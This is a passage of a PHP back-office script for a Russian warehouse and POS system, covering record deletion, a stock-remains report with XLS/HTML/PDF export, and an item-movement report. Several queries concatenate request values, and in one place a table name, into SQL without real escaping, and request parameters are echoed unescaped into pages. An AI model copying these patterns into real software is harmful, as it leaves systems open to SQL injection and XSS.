                $conductBtn = '<button type="button" class="btn btn-primary" onclick="conductA(this,\''.$newdoc.'\',\'\')">Провести</button>';

            echo '<input type="hidden" name="isgroup" value="0"></form></div></div><div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Отмена</button>'
.$actionBtns
.$conductBtn
.'<button type="button" class="btn btn-primary" onclick="saveA(this, \''.$newdoc.'\',0)">Добавить</button>
</div></div></div></div>';             
            }
        break;
        //получение кол-ва дочерних элементов 
        case 'getcounts':
            $id = isset( $_POST['id'] ) ? intval( $_POST['id'] ) : 0;       
            $tablename = isset( $_GET['table'] ) ? $_GET['table'] : '';    
            
            if ( substr( $tablename, 2 ) != 'calculations' ){
                $query = mysql_query( "SELECT COUNT(*) AS counts FROM `t_".addslashes( substr( $tablename, 2 ) )."` WHERE documentid='".$id."'");   
                $row = mysql_fetch_array( $query );

                if ( intval( $row[0]['counts'] ) > 0 && isConducted( $tablename, $id ) ) echo '1';
                else echo '0';
            } else echo '0';
        break;
        //удаление элемента и группы из базы
        case 'delete':
            $tablename = isset( $_POST['table'] ) ? $_POST['table'] : '';  
            $id = isset( $_POST['id'] ) ? intval( $_POST['id'] ) : 0;

            $icandoit = false;
            
            if ( substr( $tablename, 2 ) == 'calculations' )
                $icandoit = true;
            else
                $icandoit = !isConducted( $tablename, $id );
            
            if ( $icandoit && substr( $tablename, 0, 2 ) == 'd_' ) delete_subdata( 't_'.( substr( $tablename, 2 ) ), 'documentid', $id );
            else if ( $icandoit && substr( $tablename, 0, 2 ) == 's_' ) delete_subdata( 't_'.( substr( $tablename, 2 ) ), 'calculationid', $id );

            $answer = array();
            $answer['params'] = $id.' - '.$tablename;
            $answer["result"] = '';
            if ( $icandoit ){
                $documentid = 0;
                if ( substr( $tablename, 0, 2 ) == 't_' ){
                    if ( $tablename == 't_calculations' )
                        $query = mysql_query( "SELECT calculationid FROM `".addslashes( $tablename )."` WHERE id=".addslashes( $id ) );
                    else
                        $query = mysql_query( "SELECT documentid FROM `".addslashes( $tablename )."` WHERE id=".addslashes( $id ) );
                    $row = mysql_fetch_row( $query );
                    $documentid = $row[0];
                }
                if ( mysql_query( "DELETE FROM `".addslashes( $tablename )."` WHERE id='".addslashes( $id )."'" ) ){
                    $answer["result"] = 'Удаление выполнено';

                    if ( substr( $tablename, 0, 2 ) == 't_' && $tablename != 't_calculations' ){
                        $table = 'd_'.addslashes( substr( $tablename, 2 ) );
                        $answer["total"] = get_db_select_sum( $fields[$table]['total']['db_select'], $fields[$table]['total']['idfield'], $documentid, $fields[$table]['total']['sumfield'], 2 );
                        if ( $table == 'd_inventory' ){
                            $answer["totalplanned"] = get_db_select_sum( $fields[$table]['totalplanned']['db_select'], $fields[$table]['totalplanned']['idfield'], $documentid, $fields[$table]['totalplanned']['sumfield'], 2 );
                            $answer["totaldiff"] = get_db_select_sum( $fields[$table]['totaldiff']['db_select'], $fields[$table]['totaldiff']['idfield'], $documentid, $fields[$table]['totaldiff']['sumfield'], 3 );
                        }
                    }
                    
                    zlog( json_encode( array(
                        'table' => $tablename,
                        'row' => $row 
                    ) ), 1003 );
                } else $answer["result"] = 'Удалить не получилось...';
            } else $answer["result"] = 'Нельзя просто так взять и удалить!';

            echo json_encode( $answer );
        break;
        case 'remains':           
             //Вывод на экран
             $output = array();
             //Сортировка
             $order = 'id';
             //Группировка
             $group = '';
             //В эксель выводим бордеры у таблиц
             $inxls = '';
             
             //Принт версия
             if ( isset( $_GET['print'] ) ){
                 $inxls = 'border="1"';
                 if ( isset( $_GET['chb'] ) ) $_POST['chb'] = $_GET['chb'];
                 if ( isset( $_GET['chb_zasmenu'] ) ) $_POST['chb_zasmenu'] = $_GET['chb_zasmenu'];
                 if ( isset( $_GET['chb_zaperiod1'] ) ) $_POST['chb_zaperiod1'] = $_GET['chb_zaperiod1'];
                 if ( isset( $_GET['chb_zaperiod2'] ) ) $_POST['chb_zaperiod2'] = $_GET['chb_zaperiod2'];
                 if ( isset( $_GET['warehouseid'] ) )   $_POST['warehouseid']   = $_GET['warehouseid'];
                 if ( isset( $_GET['groupbyclient'] ) )   $_POST['groupbyclient']   = $_GET['groupbyclient'];
                 if ( isset( $_GET['itemid'] ) )   $_POST['itemid']   = $_GET['itemid'];
                 if ( isset( $_GET['notitem'] ) )   $_POST['notitem']   = $_GET['notitem'];
             } else {
                 //Формирование ссылки на кнопку "В файл"
                $query_string = array();
                if ( isset( $_POST['chb'] ) ) $query_string[] = 'chb='.$_POST['chb'];
                if ( isset( $_POST['chb_zasmenu'] ) ) $query_string[] = 'chb_zasmenu='.$_POST['chb_zasmenu'];
                if ( isset( $_POST['chb_zaperiod1'] ) ) $query_string[] = 'chb_zaperiod1='.$_POST['chb_zaperiod1'];
                if ( isset( $_POST['chb_zaperiod2'] ) ) $query_string[] = 'chb_zaperiod2='.$_POST['chb_zaperiod2'];
                if ( isset( $_POST['warehouseid'] ) )   $query_string[] = 'warehouseid='.$_POST['warehouseid'];
                if ( isset( $_POST['groupbyclient'] ) )   $query_string[] = 'groupbyclient='.$_POST['groupbyclient'];
                if ( isset( $_POST['itemid'] ) )   $query_string[] = 'itemid='.$_POST['itemid'];
                if ( isset( $_POST['notitem'] ) )   $query_string[] = 'notitem='.$_POST['notitem'];
            }
            
            $fromFront = isset( $_SESSION['idap'] );
            
//Проведение счетов, если отчет запрашивается из Фронта
            if ( $fromFront && empty( $_GET['print'] ) ){
                $whereO = array();
                $whereO[] = 'idautomated_point="'.addslashes( $_SESSION['idap'] ).'"';
                $whereO[] = 'changeid="'.( $_POST['chb_zasmenu'] > 0 ? addslashes( $_POST['chb_zasmenu'] ) : 0 ).'"';
                $whereO[] = 'conducted=0 AND closed=1';

// НУЖНО ГДЕ-ТО ХРАНИТЬ ПАРАМЕТР!!!
// UPD: теперь это зависит от торговой точки хХ
//                $withIngredients = false;
                
                $answerO = '';
                
                $query = 'SELECT id FROM d_order '.( !empty( $whereO ) ? 'WHERE '.join( ' AND ', $whereO ) : '' );
                //$query = 'SELECT id FROM d_order WHERE (creationdt>="2013-11-17 00:00:00") AND (creationdt<="2013-11-23 23:59:59") AND conducted=0';

                if ( $result = mysql_query( $query ) ){// AND id=18452
                    while ( $row = mysql_fetch_array( $result ) ){
                        if ( conduct( 'd_order', $row['id']/*, $withIngredients*/ ) )
                            $answerO .= 'Счет №'.$row['id'].' проведен<br />';
                        else
                            $answerO .= 'Счет №'.$row['id'].' не был проведен<br />';
                    }
                }
            }
////Проведение счетов, если отчет запрашивается из Фронта

            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[]='<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            $output[]='<div class="div_otchet">';
            
            $i = 1;
            $title = '';

            //ФИЛЬТРЫ
            $where1 = array();
            $where2 = array();
            $where3 = array();
            if ( $_POST['warehouseid'] > 0 ){
                $where1[] = 'warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where2[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where3[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
            }
            switch( $_POST['chb'] ){
                case 'zasmenu':
                    if ( $_POST['chb_zasmenu'] > 0 ){
                        $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                        $row = mysql_fetch_array( $result );
                        
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'"';
                        $_POST['chb_zaperiod1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                        
                        if ( $row['closed'] == 0 ){
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', time() );
                        } else {
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) );
                        }
                        $title = 'За смену: '.$row['dtopen'].'_'.$row['dtclosed'];
                    }
                break;
                case 'zaperiod':
                    if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'"';
                        $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $title='За период: с '.$_POST['chb_zaperiod1'].' по '.$_POST['chb_zaperiod2'];
                    }
                break;
            }
            if (!empty($_POST['itemid'])){
                $where1[]='itemid '.(!empty($_POST['notitem'])?'NOT':'').' IN ('.getAllIdByParentid($_POST['itemid']).addslashes($_POST['itemid']).')';
                $where2[]='r.itemid '.(!empty($_POST['notitem'])?'NOT':'').' IN ('.getAllIdByParentid($_POST['itemid']).addslashes($_POST['itemid']).')';
                $where3[]='r.itemid '.(!empty($_POST['notitem'])?'NOT':'').' IN ('.getAllIdByParentid($_POST['itemid']).addslashes($_POST['itemid']).')';
            }

            $output[] = $title.'<br />';
            $output[]='<div><table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Товар</td>
<td rowspan="2">Характеристика</td>
<td rowspan="2">Ед. изм.</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Начало периода</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Приход</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Расход</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Конец периода</td>
</tr>
<tr class="tableheader">
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
</tr>';

if (empty( $where1)&&empty( $where2)&&empty( $where3)) die('Выберите период');

            $query = mysql_query( "SELECT 
IFNULL(w.name, '') AS warehouse, IFNULL(i.name, '') AS item, IFNULL(spc.name, '') AS specification, m.name AS measure, r.itemid, r.warehouseid, r.specificationid, 
IFNULL(SUM(r.quantity) - IFNULL(income.quantity, 0) + IFNULL(outcome.quantity, 0), 0) AS quantity, 
IFNULL(SUM(r.costsum) - IFNULL(income.rsum, 0) + IFNULL(outcome.rsum, 0), 0) AS rsum, 
IFNULL(income.quantity, 0) AS quantityplus, 
IFNULL(income.rsum, 0) AS plussum, 
IFNULL(outcome.quantity, 0) AS quantityminus, 
IFNULL(outcome.rsum, 0) AS minussum, 
IFNULL(SUM(r.quantity), 0)  AS newremains, 
IFNULL(SUM(r.costsum), 0) AS newrsum 
FROM r_remainder AS r 
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity, SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice 
FROM r_remainder AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )."  AND quantity > 0
GROUP BY warehouseid, itemid, specificationid 
) AS income ON income.itemid = r.itemid AND income.warehouseid = r.warehouseid AND income.specificationid=r.specificationid  
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, (-1) * SUM(quantity) AS quantity, (-1) * SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice 
FROM r_remainder AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )."  AND quantity < 0
GROUP BY warehouseid, itemid, specificationid 
) AS outcome ON outcome.itemid = r.itemid AND outcome.warehouseid = r.warehouseid AND outcome.specificationid=r.specificationid 
LEFT JOIN s_warehouse AS w ON w.id = r.warehouseid 
LEFT JOIN s_items AS i ON i.id = r.itemid 
LEFT JOIN s_specifications AS spc ON spc.id=r.specificationid 
LEFT JOIN s_units_of_measurement AS m ON m.id=i.measurement 
".( !empty( $where3 ) ? ' WHERE '.join( ' AND ', $where3) : '' )."
GROUP BY r.warehouseid, r.itemid, r.specificationid  
ORDER BY warehouse, item, specification");



/*
//старый запрос
$query = mysql_query( "SELECT 
IFNULL(w.name, '') AS warehouse, IFNULL(i.name, '') AS item, IFNULL(spc.name, '') AS specification, m.name AS measure, r.itemid, r.warehouseid, r.specificationid, 
IFNULL(remains.quantity, 0) AS quantity, 
IFNULL(remains.rsum, 0) AS rsum, 
IFNULL(income.quantity, 0) AS quantityplus, 
IFNULL(income.rsum, 0) AS plussum, 
IFNULL(outcome.quantity, 0) AS quantityminus, 
IFNULL(outcome.rsum, 0) AS minussum, 
(IFNULL(remains.quantity, 0) + IFNULL(income.quantity, 0) - IFNULL(outcome.quantity, 0)) AS newremains, 
(IFNULL(remains.rsum, 0) + IFNULL(income.rsum, 0) - IFNULL(outcome.rsum, 0)) AS newrsum 
FROM r_remainder AS r 
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity, SUM(costsum) AS rsum 
FROM r_remainder AS r
".( !empty( $where1 ) ? ' WHERE '.join( ' AND ', $where1) : '' )."
GROUP BY warehouseid, itemid, specificationid
) AS remains ON remains.itemid = r.itemid AND remains.warehouseid = r.warehouseid AND remains.specificationid=r.specificationid 
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity, SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice 
FROM r_remainder AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )."  AND quantity > 0
GROUP BY warehouseid, itemid, specificationid 
) AS income ON income.itemid = r.itemid AND income.warehouseid = r.warehouseid AND income.specificationid=r.specificationid  
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, (-1) * SUM(quantity) AS quantity, (-1) * SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice 
FROM r_remainder AS r 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )."  AND quantity < 0
GROUP BY warehouseid, itemid, specificationid 
) AS outcome ON outcome.itemid = r.itemid AND outcome.warehouseid = r.warehouseid AND outcome.specificationid=r.specificationid 
LEFT JOIN s_warehouse AS w ON w.id = r.warehouseid 
LEFT JOIN s_items AS i ON i.id = r.itemid 
LEFT JOIN s_specifications AS spc ON spc.id=r.specificationid 
LEFT JOIN s_units_of_measurement AS m ON m.id=i.measurement 
".( !empty( $where3 ) ? ' WHERE '.join( ' AND ', $where3) : '' )." 
GROUP BY r.warehouseid, r.itemid, r.specificationid  
ORDER BY warehouse, item, specification" );
*/

            
            $i = 1;
            $sum['rsum'] = 0;
            $sum['plussum'] = 0;
            $sum['minussum'] = 0;
            $sum['newrsum'] = 0;
            $cursum['rsum'] = 0;
            $cursum['plussum'] = 0;
            $cursum['minussum'] = 0;
            $cursum['newrsum'] = 0;
            $curwarehouse = '';

            while ( $row = mysql_fetch_assoc( $query ) ){
               
                if ( $curwarehouse != $row['warehouse']){
                    if ( !$fromFront && $i > 1 ){
                        $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['rsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rsum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['minussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['newrsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['newrsum'], 2 ).'</b></td>
</tr>';
                        
                        $sum['rsum'] += $cursum['rsum'];
                        $sum['plussum'] += $cursum['plussum'];
                        $sum['minussum'] += $cursum['minussum'];
                        $sum['newrsum'] += $cursum['newrsum'];
                        $cursum['rsum'] = 0;
                        $cursum['plussum'] = 0;
                        $cursum['minussum'] = 0;
                        $cursum['newrsum'] = 0;
                    }
                    
                    $curwarehouse = $row['warehouse'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="12">Склад: <b>'.$row['warehouse'].'</b></td></tr>';
                }
                $cursum['rsum'] += $row['rsum'];
                $cursum['plussum'] += $row['plussum'];
                $cursum['minussum'] += $row['minussum'];
                $cursum['newrsum'] += $row['newrsum'];

                $output[] = '<tr id="'.$row['itemid'].'_'.$row['warehouseid'].'_'.$row['specificationid'].'" class="itemremains">
<td>'.$i.'</td>
<td>'.$row['item'].'</td>
<td>'.$row['specification'].'</td>
<td>'.$row['measure'].'</td>
<td style="'.$right.( $row['quantity'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantity'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['rsum'] < 0 ? $deficitColor : '' ).'">'.round( $row['rsum'], 2 ).'</td>').'
<td style="'.$right.( $row['quantityplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityplus'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['plussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['plussum'], 2 ).'</td>').'
<td style="'.$right.( $row['quantityminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityminus'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['minussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['minussum'], 2 ).'</td>').'
<td style="'.$right.( $row['newremains'] < 0 ? $deficitColor : '' ).'">'.round( $row['newremains'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['newrsum'] < 0 ? $deficitColor : '' ).'">'.round( $row['newrsum'], 2 ).'</td>').'
</tr>';
                $i++;
            }
            
            if ( !$fromFront ){
                $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['rsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rsum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['minussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['newrsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['newrsum'], 2 ).'</b></td>
</tr>';
                        
            $sum['rsum'] += $cursum['rsum'];
            $sum['plussum'] += $cursum['plussum'];
            $sum['minussum'] += $cursum['minussum'];
            $sum['newrsum'] += $cursum['newrsum'];
            
            $output[] = '<tr class="tableheader">
<td colspan="5"><b>Итого</b></td>
<td style="'.$right.( $sum['rsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['rsum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $sum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $sum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['minussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $sum['newrsum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['newrsum'], 2 ).'</b></td>
</tr>';
            }
             
            $output[] = '</table></div><br />';
            $output[] = '</div>';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        //header( "Content-Type: application/download\n" ); 
                        header("Content-Type: application/download; charset=utf-8\n"); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        //echo iconv( "UTF-8", "windows-1251", $res );
                        echo $res;
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
             } else echo join( "\n", $output );
             if ( empty( $_GET['print'] ) && empty( $_SESSION['idap'] ) ){
                 echo '<script>
$( ".itemremains" ).die( "click" );
$( ".itemremains" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "_" );
    itemid = s.substr( 0, pos1 );
    s = s.substr( pos1 + 1 );
    pos1 = s.indexOf( "_" );
    warehouseid = s.substr( 0, pos1 );
    specificationid = s.substr( pos1 + 1 );
    title = "Движения товаров";
    otchet = "gethtml_remainsdetailed";
    console.log(warehouseid + " - " + itemid + " - " + specificationid);
    $.ajax({ 
        type: "POST",
        url: "/company/warehouse/warehouse.php?do=remainsdetailed&item="+itemid+"&warehouse="+warehouseid+"&specification="+specificationid+"&dt1='.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'&dt2='.date( 'Y-m-d H:i:s',strtotime( $_POST['chb_zaperiod2'] ) ).'"
    }).success( function ( form ){
        removeTabIfExist( \'#tab_\' + otchet );
        cont = \'<div class="bggrey"><h4>\' + title + \'</h4></div><div class="righttd-content">\' + form + \'</div>\';     
        addTab( title, otchet, cont ); 
        $( \'.righttd-content\' ).height( $( \'.righttd\' ).height() - 144 );
    });
});
</script>';
                 
                 echo '<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
             }
///////////////////////////////////////
        break;
        //движение товаров отчет это, показывает в каких документах этот товать ЕСТ
        case 'remainsdetailed':
            $output = array();
            $order = 'id';
            $group = '';
            $inxls = '';
            $fromRR = true;
            
            if ( isset( $_POST['itemid'] ) ){
                $_GET['item'] = $_POST['itemid'];
                 
                if ( isset( $_POST['chb'] ) ){
                    switch( $_POST['chb'] ){
                        case 'zasmenu':
                            if ( $_POST['chb_zasmenu'] > 0 ){
                                $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                                $row = mysql_fetch_array( $result );

                                $_GET['dt1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                                $_GET['dt2'] = date( 'Y-m-d H:i:s', ( $row['closed'] == 0 ? time() : strtotime( $row['dtclosed'] ) ) );
                            }
                        break;
                        case 'zaperiod':
                            if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                                $_GET['dt1'] = date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) );
                                $_GET['dt2'] = date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) );
                            }
                        break;
                    }
                }
                if ( isset( $_POST['warehouseid'] ) ) $_GET['warehouse'] = $_POST['warehouseid'];
                
                $fromRR = false;
            }
             
            if ( isset( $_GET['print'] ) ){
                $inxls = 'border="1"';
            } else {
                $query_string = array();
                if ( isset( $_GET['dt1'] ) )        $query_string[] = 'dt1='.$_GET['dt1'];
                if ( isset( $_GET['dt2'] ) )        $query_string[] = 'dt2='.$_GET['dt2'];
                if ( isset( $_GET['item'] ) )       $query_string[] = 'item='.$_GET['item'];
                if ( isset( $_GET['warehouse'] ) )  $query_string[] = 'warehouse='.$_GET['warehouse'];
            }
            
            $i = 1;
            $title = '';

            $where1 = array();
            $where2 = array();
            if ( $_GET['warehouse'] > 0 ){
                $where1[] = 'warehouseid="'.addslashes( $_GET['warehouse'] ).'"';
                $where2[] = 'r.warehouseid="'.addslashes( $_GET['warehouse'] ).'"';
            }
            if ( $_GET['specification'] > 0 ){
                $where1[] = 'specificationid="'.addslashes( $_GET['specification'] ).'"';
                $where2[] = 'r.specificationid="'.addslashes( $_GET['specification'] ).'"';
            }
            if ( $_GET['item'] > 0 ){
                $where1[] = 'itemid="'.addslashes( $_GET['item'] ).'"';
                $where2[] = 'r.itemid="'.addslashes( $_GET['item'] ).'"';
            }
            $period = '';
            if ( ( $_GET['dt1'] != '' ) && ( $_GET['dt2'] != '' ) ){
                $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_GET['dt1'] ) ).'"';
                $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_GET['dt1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s',strtotime( $_GET['dt2'] ) ).'"';
                
                $period = date( 'd.m.Y H:i:s', strtotime( $_GET['dt1'] ) ).' по '.date( 'd.m.Y H:i:s',strtotime( $_GET['dt2'] ) );
            }
            
//            if ( $showHeaders ){
//                $itemname = '';
//                $whname = '';
//            
//                $query = mysql_query( "SELECT i.name AS itemname, w.name AS whname FROM s_items AS i, s_warehouse AS w 
//WHERE i.id='".addslashes( $_GET['item'] )."' AND w.id='".addslashes( $_GET['warehouse'] )."'" );
//            
//                if ( $row = mysql_fetch_array( $query ) ){                
//                    $itemname = $row['itemname'];
//                    $whname = $row['whname'];
//                }
//            }
            
            $rquantity = 0;
            $rsum = 0;
            
            $query = mysql_query( "SELECT DISTINCT 
IFNULL(remains.quantity, 0) AS quantity, 
IFNULL(remains.rsum, 0) AS rsum
FROM r_remainder AS r 
LEFT JOIN ( 
SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity, SUM(costsum) AS rsum 
FROM r_remainder AS r
".( !empty( $where1 ) ? ' WHERE '.join( ' AND ', $where1) : '' )."
GROUP BY warehouseid, itemid, specificationid
) AS remains ON remains.itemid = r.itemid AND remains.warehouseid = r.warehouseid 
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." 
GROUP BY r.warehouseid, r.itemid, r.specificationid" );
            
            if ( $row = mysql_fetch_array( $query ) ){
                $rquantity = $row['quantity'];
                $rsum = $row['rsum'];
            }
            
//            if ( $row = mysql_fetch_assoc( $query ) ){
//                $rquantity = $row['quantity'];
//                $rsum = $row['rsum'];
//                
//                $output[] = '<div class="modal fade" id="dialog_remainsdetails" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
//<div class="modal-dialog" style="width:900px" >
//<div class="modal-content">
//<div class="modal-header">
//    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
//    <h4 class="modal-title">Движения товара "'.$row["item"].'" по складу "'.$row["warehouse"].'"</h4>
//    <h5>за период с '.$_GET['dt1'].' по '.$_GET['dt2'].'</h3>
//</div>
//<div class="modal-body">';
//            } else {
//                $output[] = '<div class="modal fade" id="dialog_remainsdetails" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
//<div class="modal-dialog" style="width:900px" >
//<div class="modal-content">
//<div class="modal-header">
//    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
//    <h4 class="modal-title">Движения товара</h4>
//</div>
//<div class="modal-body">';
//            }
            
            $filterContent = '';
            
            if ( $fromRR ){                
                $filterContent = $template['gethtml_remainsdetailed'];
                
                $itemname = '';
                $whname = '';
            
                $query = mysql_query( 
"SELECT i.name AS itemname, w.name AS whname 
FROM s_items AS i 
LEFT JOIN s_warehouse AS w ON w.id='".addslashes( $_GET['warehouse'] )."' 
WHERE i.id='".addslashes( $_GET['item'] )."'" );
            
                if ( $row = mysql_fetch_array( $query ) ){                
                    $itemname = $row['itemname'];
                    $whname = $row['whname'];
                }
                
                $filterContent = str_replace( '{vitemname}', $itemname, $filterContent );
                $filterContent = str_replace( '{vitemid}', $_GET['item'], $filterContent );
                $filterContent = str_replace( '{vwarehousename}', $whname, $filterContent );
                $filterContent = str_replace( '{vwarehouseid}', $_GET['warehouse'], $filterContent );
                $filterContent = str_replace( '{dtcheck}', 'checked', $filterContent );
